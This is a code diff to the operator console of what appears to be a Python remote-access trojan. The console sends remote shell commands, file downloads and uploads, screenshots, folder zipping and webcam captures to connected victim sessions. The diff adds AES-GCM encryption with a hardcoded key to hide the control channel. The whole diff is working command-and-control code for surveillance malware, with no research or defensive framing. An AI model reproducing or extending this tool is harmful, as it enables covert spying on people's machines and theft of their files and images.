@@ -4,6 +4,9 @@ import base64
 import socket
 import json
 import threading
+import os
+import cryptography
+from cryptography.hazmat.primitives.ciphers.aead import AESGCM
 # non-standard libraries
 import texttable
 
@@ -13,8 +16,10 @@ class Server:
         self.timeout = 30
         self.zip_compression_level = 0
         self.camera_port = 0
+        self.percentage_dec_places = 1
         self.connection = Connection()
 
+    def main(self):
         while True:
             entered = input("[+] ")
             if entered:
@@ -23,7 +28,7 @@ class Server:
 
                 if command == "h":
                     self.print_help()
-                elif command == "o" and len(attribute[0].split()) == 2 and attribute[0].split()[0].lower() in ["timeout", "zip_compression", "camera_port"]:
+                elif command == "o" and len(attribute[0].split()) == 2 and attribute[0].split()[0].lower() in ["timeout", "zip_compression", "camera_port", "percentage_dec_places"]:
                     self.set_option(attribute[0].split()[0].lower(), attribute[0].split()[1])
                 elif command == "l" and len(attribute):
                     self.generate_texttable(self.get_conn_fgoi(attribute[0].split()))
@@ -113,8 +118,6 @@ class Server:
                     self.camera_port = int(value)
             except ValueError:
                 print("[-] InvalidCameraPort")
-        else:
-            print("[-] UnknownOption")
 
     def change_tag(self, tag, connections):
         for index, session in enumerate(self.connection.sessions):
@@ -127,7 +130,7 @@ class Server:
         for session in list(self.connection.sessions):
             if session["connection"] in connections:
                 try:
-                    self.connection.send(self.enc_request(request), session["connection"])
+                    self.connection.send(self.encode_request(request), session["connection"])
                 except socket.error:
                     pass
                 session["connection"].close()
@@ -159,16 +162,16 @@ class Server:
                    "timeout": self.timeout}
         for connection in connections:
             try:
-                self.connection.send(self.enc_request(request), connection)
-                response = self.dec_response(self.connection.recv(connection))
+                self.connection.send(self.encode_request(request), connection)
+                response = self.decode_response(self.connection.recv(connection))
 
                 if response["data"]:
                     print(response["data"])
                 if response["error"]:
-                    print("[-]", response["error"])
+                    print(f"[-] {response['error']}")
 
             except socket.error as error:
-                print("[-] SocketError: " + str(error) + ": " + str(self.get_index_by_connection(connection)))
+                print(f"[-] SocketError: {error}: {self.get_index_by_connection(connection)}")
 
     def execute_command(self, exe, connections):
         request = {"cmd": "c",
@@ -176,41 +179,41 @@ class Server:
                    "timeout": self.timeout}
         for connection in connections:
             try:
-                self.connection.send(self.enc_request(request), connection)
-                response = self.dec_response(self.connection.recv(connection))
+                self.connection.send(self.encode_request(request), connection)
+                response = self.decode_response(self.connection.recv(connection))
 
                 if response["data"]:
                     print(response["data"])
                 if response["error"]:
-                    print("[-] " + response["error"])
+                    print(f"[-] {response['error']}")
 
             except socket.error as error:
-                print("SocketError: " + str(error) + ": " + str(self.get_index_by_connection(connection)))
+                print(f"[-] SocketError: {error}: {self.get_index_by_connection(connection)}")
 
     def download_file(self, path_to_open, path_to_save, connections):
         request = {"cmd": "d",
                    "open_path": path_to_open}
         for connection in connections:
             try:
-                self.connection.send(self.enc_request(request), connection)
-                response = self.dec_response(self.connection.recv(connection))
+                self.connection.send(self.encode_request(request), connection)
+                response = self.decode_response(self.connection.recv(connection))
                 if response["error"]:
-                    print("[-] " + response["error"])
+                    print(f"[-] {response['error']}")
                 else:
                     len_data_total = int(response["length"])
-                    data = bytes()
+                    data = bytearray()
                     while not data.endswith(self.connection.END_MARKER):
-                        data += connection.recv(self.connection.PACKET_SIZE)
+                        data.extend(connection.recv(self.connection.PACKET_SIZE))
                         len_data_current = len(data)
-                        self.update_line("\r[*] " + str(int(len_data_current / (len_data_total / 100))) + "% complete")
+                        self.update_line(f"\r[*] {round(len_data_current / (len_data_total / 100), 1)}% [{self.format_byte_length(len_data_current)} / {self.format_byte_length(len_data_total)}] complete")
                     data = base64.b64decode(data[:-(len(self.connection.END_MARKER))])
-                    with open(path_to_save, "wb") as file:
-                        # TODO error handling
-                        file.write(data)
+                    try:
+                        with open(path_to_save, "wb") as file:
+                            file.write(data)
+                    except PermissionError:
+                        print("[-] PermissionError")
             except socket.error as error:
-                self.update_line("\r[-] SocketError: " + str(error) + ": " + str(self.get_index_by_connection(connection)))
-            except KeyboardInterrupt:
-                self.update_line("\r[*] download canceled")
+                self.update_line(f"\r[-] SocketError: {error}: {self.get_index_by_connection(connection)}")
             print()
 
     def upload_file(self, path_to_open, path_to_save, connections):
@@ -218,7 +221,7 @@ class Server:
                    "save_path": path_to_save}
         try:
             with open(path_to_open, "rb") as file:
-                data = base64.b64encode(file.read()) + self.connection.END_MARKER
+                data = bytearray(base64.b64encode(file.read()) + self.connection.END_MARKER)
         except FileNotFoundError:
             print("[-] FileNotFoundError")
         except PermissionError:
@@ -227,22 +230,19 @@ class Server:
             for connection in connections:
                 try:
                     len_data_total = len(data)
-                    self.connection.send(self.enc_request(request), connection)
+                    self.connection.send(self.encode_request(request), connection)
                     while data:
                         connection.send(data[:self.connection.PACKET_SIZE])
-                        data = data[self.connection.PACKET_SIZE:]
+                        del data[:self.connection.PACKET_SIZE]
                         len_data_current = len_data_total - len(data)
-                        self.update_line("\r[*] " + str(int(len_data_current / (len_data_total / 100))) + "% complete")
-                    response = self.dec_response(self.connection.recv(connection))
+                        self.update_line(f"\r[*] {round(len_data_current / (len_data_total / 100), 1)}% [{self.format_byte_length(len_data_current)} / {self.format_byte_length(len_data_total)}] complete")
+                    response = self.decode_response(self.connection.recv(connection))
 
                     if response["error"]:
-                        print("[-] " + response["error"])
+                        print(f"[-] {response['error']}")
 
                 except socket.error as error:
-                    self.update_line("\r[-] SocketError: " + str(error) + ": " + str(self.get_index_by_connection(connection)))
-                except KeyboardInterrupt:
-                    # TODO test
-                    self.update_line("\r[*] upload canceled")
+                    self.update_line(f"\r[-] SocketError: {error}: {self.get_index_by_connection(connection)}")
                 print()
 
     def make_screenshot(self, monitor, path_to_save, connections):
@@ -252,14 +252,14 @@ class Server:
                    "timeout": self.timeout}
         for connection in connections:
             try:
-                self.connection.send(self.enc_request(request), connection)
-                response = self.dec_response(self.connection.recv(connection))
+                self.connection.send(self.encode_request(request), connection)
+                response = self.decode_response(self.connection.recv(connection))
 
                 if response["error"]:
-                    print("[-] " + response["error"])
+                    print(f"[-] {response['error']}")
 
             except socket.error as error:
-                print("[-] SocketError: " + str(error) + ": " + str(self.get_index_by_connection(connection)))
+                print(f"[-] SocketError: {error}: {self.get_index_by_connection(connection)}")
 
     def zip_file_or_folder(self, path_to_open, path_to_save, connections):
         request = {"cmd": "z",
@@ -269,14 +269,14 @@ class Server:
                    "timeout": self.timeout}
         for connection in connections:
             try:
-                self.connection.send(self.enc_request(request), connection)
-                response = self.dec_response(self.connection.recv(connection))
+                self.connection.send(self.encode_request(request), connection)
+                response = self.decode_response(self.connection.recv(connection))
 
                 if response["error"]:
-                    print("[-] " + response["error"])
+                    print(f"[-] {response['error']}")
 
             except socket.error as error:
-                print("[-] SocketError: " + str(error) + ": " + str(self.get_index_by_connection(connection)))
+                print(f"[-] SocketError: {error}: {self.get_index_by_connection(connection)}")
 
     def capture_camera_picture(self, path_to_save, connections):
         request = {"cmd": "w",
@@ -285,14 +285,14 @@ class Server:
                    "timeout": self.timeout}
         for connection in connections:
             try:
-                self.connection.send(self.enc_request(request), connection)
-                response = self.dec_response(self.connection.recv(connection))
+                self.connection.send(self.encode_request(request), connection)
+                response = self.decode_response(self.connection.recv(connection))
 
                 if response["error"]:
-                    print("[-] " + response["error"])
+                    print(f"[-] {response['error']}")
 
             except socket.error as error:
-                print("[-] SocketError: " + str(error) + ": " + str(self.get_index_by_connection(connection)) + "\n")
+                print(f"[-] SocketError: {error}: {self.get_index_by_connection(connection)}")
 
     def get_conn_fgoi(self, objects):  # get connections from groups and/or indices
         connections = list()
@@ -314,11 +314,19 @@ class Server:
         sys.stdout.write(text)
         sys.stdout.flush()
 
-    def enc_request(self, request):
+    def encode_request(self, request):
         return json.dumps(request).encode(self.connection.CODEC)
 
-    def dec_response(self, response):
+    def decode_response(self, response):
         return json.loads(response.decode(self.connection.CODEC))
+
+    # credit: https://stackoverflow.com/questions/1094841/reusable-library-to-get-human-readable-version-of-file-size
+    def format_byte_length(self, num, suffix='B'):
+        for unit in ['', 'Ki', 'Mi', 'Gi', 'Ti', 'Pi', 'Ei', 'Zi']:
+            if abs(num) < 1024.0:
+                return f"{num:3.1f} {unit}{suffix}"
+            num /= 1024.0
+        return f"{num:3.1f} Yi{suffix}"
 
 
 class Connection:
@@ -330,6 +338,9 @@ class Connection:
 
         HOST = "127.0.0.1"
         PORT = 10001
+        KEY = b'\xbch`9\xd6k\xcbT\xed\xa5\xef_\x9d*\xda\xd2sER\xedA\xc0a\x1b)\xcc9\xb2\xe7\x91\xc2A'
+
+        self.crypter = AESGCM(KEY)
 
         self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
@@ -356,15 +367,23 @@ class Connection:
                 self.sessions.append(session)
 
     def send(self, data, connection):
-        data = base64.b64encode(data) + self.END_MARKER
+        data = base64.b64encode(self.encrypt(data)) + self.END_MARKER
         connection.send(data)
 
     def recv(self, connection):
-        data = bytes()
+        data = bytearray()
         while not data.endswith(self.END_MARKER):
-            data += connection.recv(self.PACKET_SIZE)
-        return base64.b64decode(data[:-1])
+            data.extend(connection.recv(self.PACKET_SIZE))
+        return self.decrypt(base64.b64decode(data[:-1]))
+
+    def encrypt(self, data):
+        nonce = os.urandom(12)
+        return nonce + self.crypter.encrypt(nonce, data, b"")
+
+    def decrypt(self, cipher):
+        return self.crypter.decrypt(cipher[:12], cipher[12:], b"")
 
 
 if __name__ == "__main__":
     server = Server()
+    server.main()
